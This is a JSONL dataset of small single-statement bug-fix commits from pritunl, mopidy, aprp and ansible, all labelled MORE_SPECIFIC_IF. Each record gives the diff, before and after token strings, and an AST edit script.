{"project": "pritunl", "commit_sha": "3f3889c534e511b90f58f101b1ff7bb0c7a88a85", "parent_sha": "95ed48cf7fe198f5d66965b9278bd565fe66ce69", "file_path": "pritunl/handlers/server.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ def server_put_post(server_id=None):\n \n     port = None\n     port_def = False\n-    if 'port' in flask.request.json:\n+    if 'port' in flask.request.json and flask.request.json['port'] != 0:\n         port_def = True\n         port = flask.request.json['port']\n \n", "before": "if 'port' in flask . request . json : port_def = True port = flask . request . json [ 'port' ]", "after": "if 'port' in flask . request . json and flask . request . json [ 'port' ] != 0 : port_def = True port = flask . request . json [ 'port' ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 5, 42], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 36], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'port'\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:json\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:flask\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:request\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "56878558119a8e525599d6ba86e66c2abe789dc0", "parent_sha": "17cbd6cc333628bbfe5b49e08189181a21a4ed35", "file_path": "pritunl/upgrade/__init__.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,5 +41,5 @@ def upgrade_server():\n         upgrade_1_24()\n         utils.set_db_ver('1.24.0.0', '1.24.0.0')\n \n-    if not upgraded:\n+    if not upgraded and utils.get_db_ver(False):\n         logger.info('No upgrade needed', 'upgrade')\n", "before": "if not upgraded : logger . info ( 'No upgrade needed' , 'upgrade' )", "after": "if not upgraded and utils . get_db_ver ( False ) : logger . info ( 'No upgrade needed' , 'upgrade' )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 8, 3, 20], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:upgraded\", 3, 12, 3, 20], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:utils\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get_db_ver\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"false:False\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "aprp", "commit_sha": "d22ccaa88838c93b4ef3f9cce0296ba961368819", "parent_sha": "ac4355c6121fdd27d4e0cd8c8682ea77c82ca1a3", "file_path": "src/dashboard/utils.py", "project_url": "https://github.com/travishen/aprp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ def jarvismenu_extra_context(instance):\n         if product.level == product.config.type_level and not user.info.is_editor:\n             pass\n \n-        elif product.types(watchlist=watchlist).count() > 1:\n+        elif product.types(watchlist=watchlist).count() > 1 and product.level == product.config.type_level:\n             extra_context['items'] = product.types(watchlist=watchlist)\n             extra_context['ct'] = 'type'\n \n", "before": "if product . level == product . config . type_level and not user . info . is_editor : pass elif product . types ( watchlist = watchlist ) . count ( ) > 1 : extra_context [ 'items' ] = product . types ( watchlist = watchlist ) extra_context [ 'ct' ] = 'type'", "after": "if product . level == product . config . type_level and not user . info . is_editor : pass elif product . types ( watchlist = watchlist ) . count ( ) > 1 and product . level == product . config . type_level : extra_context [ 'items' ] = product . types ( watchlist = watchlist ) extra_context [ 'ct' ] = 'type'", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 9, 5, 41], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 14, 3, 60], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:product\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:level\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:type_level\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:product\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:config\", \"T\"], 2]]"}
{"project": "mopidy", "commit_sha": "ea315900c3493431c42e2d818c9bdcd32c1931d3", "parent_sha": "361d66727e64b1199f945f2804e8153438ba62ed", "file_path": "mopidy/backends/__init__.py", "project_url": "https://github.com/atxwebs/mopidy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -483,7 +483,7 @@ class BasePlaybackController(object):\n         if self.consume:\n             self.backend.current_playlist.remove(original_track)\n \n-        if self.random:\n+        if self.random and self.current_track in self._shuffled:\n             self._shuffled.remove(self.current_track)\n \n     def _next(self, track):\n", "before": "if self . random : self . _shuffled . remove ( self . current_track )", "after": "if self . random and self . current_track in self . _shuffled : self . _shuffled . remove ( self . current_track )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 54], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 23], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:current_track\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:_shuffled\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "f4fd9d366b947ce0c8ea99c7edb7ec862575b161", "parent_sha": "122fff970f1fd21cd794de090aa3f49b461c43e4", "file_path": "lib/ansible/module_utils/facts.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -266,7 +266,7 @@ class Facts(object):\n             self.facts['distribution_release'] = dist[2] or 'NA'\n             # Try to handle the exceptions now ...\n             for (path, name) in Facts.OSDIST_DICT.items():\n-                if os.path.exists(path):\n+                if os.path.exists(path) and os.path.getsize(path) > 0:\n                     if self.facts['distribution'] == 'Fedora':\n                         pass\n                     elif name == 'RedHat':\n", "before": "if os . path . exists ( path ) : if self . facts [ 'distribution' ] == 'Fedora' : pass elif name == 'RedHat' : ", "after": "if os . path . exists ( path ) and os . path . getsize ( path ) > 0 : if self . facts [ 'distribution' ] == 'Fedora' : pass elif name == 'RedHat' : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 43], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 40], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:getsize\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"identifier:path\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "7c96f1d803692b4b5e5f57ce663aecb1e09263dc", "parent_sha": "2d5444806428ec8a2e1d84845064dd3c39e3d3d8", "file_path": "lib/ansible/inventory/dir.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -113,7 +113,7 @@ class InventoryDirectory(object):\n             for group in allgroup.child_groups[:]:\n                 # groups might once have beeen added to all, and later be added\n                 # to another group: we need to remove the link wit all then\n-                if len(group.parent_groups) > 1:\n+                if len(group.parent_groups) > 1 and allgroup in group.parent_groups:\n                     # real children of all have just 1 parent, all\n                     # this one has more, so not a direct child of all anymore\n                     group.parent_groups.remove(allgroup)\n", "before": "if len ( group . parent_groups ) > 1 : group . parent_groups . remove ( allgroup )", "after": "if len ( group . parent_groups ) > 1 and allgroup in group . parent_groups : group . parent_groups . remove ( allgroup )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 57], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 48], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:allgroup\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:group\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:parent_groups\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "768f2fe6d465271f6410865ac138eb62889ee401", "parent_sha": "5c7d717f31b230c53df52bc76df4b1785fe2f8cb", "file_path": "lib/ansible/plugins/action/template.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ class ActionModule(ActionBase):\n         diff = {}\n         new_module_args = self._task.args.copy()\n \n-        if local_checksum != remote_checksum:\n+        if force and local_checksum != remote_checksum:\n \n             result['changed'] = True\n             # if showing diffs, we need to get the remote value\n", "before": "if local_checksum != remote_checksum : result [ 'changed' ] = True", "after": "if force and local_checksum != remote_checksum : result [ 'changed' ] = True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 64], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:force\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 45], 2]]"}
{"project": "ansible-1", "commit_sha": "79731ce49183ff04909e247fb81d07dcdb5aef70", "parent_sha": "67d8df0e322aad9313d4e167235d1c81bc86abe0", "file_path": "lib/ansible/runner/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -900,7 +900,7 @@ class Runner(object):\n                 if (module_name == 'async_status' and \"finished\" in data) or module_name != 'async_status':\n                     if changed_when is not None and 'skipped' not in data:\n                         data['changed'] = utils.check_conditional(changed_when, self.basedir, inject, fail_on_undefined=self.error_on_undefined_vars)\n-                    if failed_when is not None:\n+                    if failed_when is not None and 'skipped' not in data:\n                         data['failed_when_result'] = data['failed'] = utils.check_conditional(failed_when, self.basedir, inject, fail_on_undefined=self.error_on_undefined_vars)\n \n             if is_chained:\n", "before": "if failed_when is not None : data [ 'failed_when_result' ] = data [ 'failed' ] = utils . check_conditional ( failed_when , self . basedir , inject , fail_on_undefined = self . error_on_undefined_vars )", "after": "if failed_when is not None and 'skipped' not in data : data [ 'failed_when_result' ] = data [ 'failed' ] = utils . check_conditional ( failed_when , self . basedir , inject , fail_on_undefined = self . error_on_undefined_vars )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 4, 177], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 24, 3, 47], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'skipped'\", \"T\"], 0], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:data\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "9ae0fb5bdfc3531b02ad0436a46dba887972d7e1", "parent_sha": "11822f0d57908da3bd11066fc57d14ccdb920ff5", "file_path": "lib/ansible/runner/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -220,7 +220,10 @@ class Runner(object):\n             # would prevent us from using ssh, and fallback to paramiko.\n             # 'smart' is the default since 1.2.1/1.3\n             self.transport = \"ssh\"\n-            if sys.platform.startswith('darwin'):\n+            if sys.platform.startswith('darwin') and self.remote_pass:\n+                # due to a current bug in sshpass on OSX, which can trigger\n+                # a kernel panic even for non-privileged users, we revert to\n+                # paramiko on that OS when a SSH password is specified\n                 self.transport = \"paramiko\"\n             else:\n                 # see if SSH can support ControlPersist if not use paramiko\n", "before": "if sys . platform . startswith ( 'darwin' ) : self . transport = \"paramiko\" else : ", "after": "if sys . platform . startswith ( 'darwin' ) and self . remote_pass : self . transport = \"paramiko\" else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 5, 18], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 49], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:remote_pass\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "f7ad6ad4de79558a315d9dbc720513c83c93af90", "parent_sha": "7c86db31876b9299016e139dd98dc524139e3e25", "file_path": "lib/ansible/runner/connection_plugins/ssh.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -335,7 +335,7 @@ class Connection(object):\n                         \"sudo\", \"Sorry, try again.\")\n                     if sudo_errput.strip().endswith(\"%s%s\" % (prompt, incorrect_password)):\n                         raise errors.AnsibleError('Incorrect sudo password')\n-                    elif sudo_errput.endswith(prompt):\n+                    elif prompt and sudo_errput.endswith(prompt):\n                         stdin.write(self.runner.sudo_pass + '\\n')\n \n                 if p.stdout in rfd:\n", "before": "if sudo_errput . strip ( ) . endswith ( \"%s%s\" % ( prompt , incorrect_password ) ) : raise errors . AnsibleError ( 'Incorrect sudo password' ) elif sudo_errput . endswith ( prompt ) : stdin . write ( self . runner . sudo_pass + '\\n' )", "after": "if sudo_errput . strip ( ) . endswith ( \"%s%s\" % ( prompt , incorrect_password ) ) : raise errors . AnsibleError ( 'Incorrect sudo password' ) elif prompt and sudo_errput . endswith ( prompt ) : stdin . write ( self . runner . sudo_pass + '\\n' )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 21, 4, 66], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:prompt\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 26, 3, 54], 2]]"}
{"project": "ansible-1", "commit_sha": "0579b8b4e66a8d704df6488c23202a3b9bc4446c", "parent_sha": "c93df29249b6b127b3768a17e973990ce371eb6e", "file_path": "lib/ansible/callbacks.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -140,7 +140,7 @@ def host_report_msg(hostname, module_name, result, oneline):\n \n     failed = utils.is_failed(result)\n     msg = ''\n-    if module_name in [ 'command', 'shell', 'raw' ] and 'ansible_job_id' not in result:\n+    if module_name in [ 'command', 'shell', 'raw' ] and 'ansible_job_id' not in result and result.get('parsed',True) != False:\n         if not failed:\n             msg = command_generic_msg(hostname, result, oneline, 'success')\n         else:\n", "before": "if module_name in [ 'command' , 'shell' , 'raw' ] and 'ansible_job_id' not in result : if not failed : msg = command_generic_msg ( hostname , result , oneline , 'success' ) else : ", "after": "if module_name in [ 'command' , 'shell' , 'raw' ] and 'ansible_job_id' not in result and result . get ( 'parsed' , True ) != False : if not failed : msg = command_generic_msg ( hostname , result , oneline , 'success' ) else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 87], [\"boolean_operator\", 3, 8, 3, 87], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 87], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 87], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N0\", [\"false:False\", \"T\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:result\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'parsed'\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"true:True\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-1", "commit_sha": "ef9238ab850617e40e0518e7b014d8883e137093", "parent_sha": "b479a80d452437e467228f36ad10f49fa36781f4", "file_path": "lib/ansible/playbook/play_context.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -356,7 +356,7 @@ class PlayContext(Base):\n \n             # and likewise for the remote user\n             for user_var in MAGIC_VARIABLE_MAPPING.get('remote_user'):\n-                if user_var in delegated_vars:\n+                if user_var in delegated_vars and delegated_vars[user_var]:\n                     break\n             else:\n                 delegated_vars['ansible_user'] = task.remote_user or self.remote_user\n", "before": "if user_var in delegated_vars : break", "after": "if user_var in delegated_vars and delegated_vars [ user_var ] : break", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 26], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 46], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:delegated_vars\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:user_var\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "f76befdb9a42a5188b4c024d2284484a89f3663c", "parent_sha": "721da4684266c2d523d312dd17ade420cceccfea", "file_path": "lib/ansible/plugins/action/service.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class ActionModule(ActionBase):\n                 del new_module_args['use']\n \n             # for backwards compatibility\n-            if new_module_args['state'] == 'running':\n+            if 'state' in new_module_args and new_module_args['state'] == 'running':\n                 new_module_args['state'] = 'started'\n \n             self._display.vvvv(\"Running %s\" % module)\n", "before": "if new_module_args [ 'state' ] == 'running' : new_module_args [ 'state' ] = 'started'", "after": "if 'state' in new_module_args and new_module_args [ 'state' ] == 'running' : new_module_args [ 'state' ] = 'started'", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 53], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 53], 2], [\"Insert\", \"N1\", [\"string:'state'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:new_module_args\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "16f3f8e24445459e11a35d4ae83f796a69283f9e", "parent_sha": "d9cf9abc12b9abeef3e0830003ab753ddbea89ce", "file_path": "lib/ansible/cli/doc.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,7 +262,7 @@ class DocCLI(CLI):\n             text.append(\"%s\\n\" % textwrap.fill(CLI.tty_ify(desc), initial_indent=opt_indent,\n                                  subsequent_indent=opt_indent))\n \n-        if 'notes' in doc and len(doc['notes']) > 0:\n+        if 'notes' in doc and doc['notes'] and len(doc['notes']) > 0:\n             notes = \" \".join(doc['notes'])\n             text.append(\"Notes:%s\\n\" % textwrap.fill(CLI.tty_ify(notes), initial_indent=\"  \",\n                                 subsequent_indent=opt_indent))\n", "before": "if 'notes' in doc and len ( doc [ 'notes' ] ) > 0 : notes = \" \" . join ( doc [ 'notes' ] ) text . append ( \"Notes:%s\\n\" % textwrap . fill ( CLI . tty_ify ( notes ) , initial_indent = \"  \" , subsequent_indent = opt_indent ) )", "after": "if 'notes' in doc and doc [ 'notes' ] and len ( doc [ 'notes' ] ) > 0 : notes = \" \" . join ( doc [ 'notes' ] ) text . append ( \"Notes:%s\\n\" % textwrap . fill ( CLI . tty_ify ( notes ) , initial_indent = \"  \" , subsequent_indent = opt_indent ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 52], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 52], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 26], 0], [\"Move\", \"N0\", [\"and:and\", 3, 27, 3, 30], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:doc\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'notes'\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "ansible-1", "commit_sha": "457a6ca03e9b4c6efe303114a7a62191927c460e", "parent_sha": "032bd1dacf088c1735a84be10dfe393e6bb105f1", "file_path": "lib/ansible/module_utils/netcfg.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ class NetworkConfig(object):\n \n     def difference(self, other, path=None, match='line', replace='line'):\n         try:\n-            if path:\n+            if path and match != 'line':\n                 try:\n                     other = other.get_section_objects(path)\n                 except ValueError:\n", "before": "if path : try : other = other . get_section_objects ( path ) except ValueError : ", "after": "if path and match != 'line' : try : other = other . get_section_objects ( path ) except ValueError : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 35], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:path\", 3, 16, 3, 20], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:match\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'line'\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "6008fbd5cf41915db6890b4e80290edd04a99732", "parent_sha": "24e81ddd1c089f7625e5b6f76a705b20a2372d8e", "file_path": "lib/ansible/executor/play_iterator.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -198,7 +198,7 @@ class PlayIterator:\n             self._host_states[host.name] = HostState(blocks=self._blocks)\n             # if the host's name is in the variable manager's fact cache, then set\n             # its _gathered_facts flag to true for smart gathering tests later\n-            if host.name in variable_manager._fact_cache:\n+            if host.name in variable_manager._fact_cache and variable_manager._fact_cache.get('module_setup', False):\n                 host._gathered_facts = True\n             # if we're looking to start at a specific task, iterate through\n             # the tasks for this host until we find the specified task\n", "before": "if host . name in variable_manager . _fact_cache : host . _gathered_facts = True", "after": "if host . name in variable_manager . _fact_cache and variable_manager . _fact_cache . get ( 'module_setup' , False ) : host . _gathered_facts = True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 44], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 57], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'module_setup'\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"false:False\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4], [\"Insert\", \"N4\", [\"identifier:variable_manager\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:_fact_cache\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "432633e4c1df5c29010beb032a085954f21ebdb6", "parent_sha": "1d3db8ec5bf95a3c7e73e176be6469a53b77af0c", "file_path": "lib/ansible/executor/task_executor.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -501,7 +501,7 @@ class TaskExecutor:\n                 vars_copy[self._task.register] = wrap_var(result.copy())\n \n             if self._task.async > 0:\n-                if self._task.poll > 0:\n+                if self._task.poll > 0 and not result.get('skipped'):\n                     result = self._poll_async_result(result=result, templar=templar, task_vars=vars_copy)\n \n                 # ensure no log is preserved\n", "before": "if self . _task . poll > 0 : result = self . _poll_async_result ( result = result , templar = templar , task_vars = vars_copy )", "after": "if self . _task . poll > 0 and not result . get ( 'skipped' ) : result = self . _poll_async_result ( result = result , templar = templar , task_vars = vars_copy )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 106], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:result\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"string:'skipped'\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2]]"}
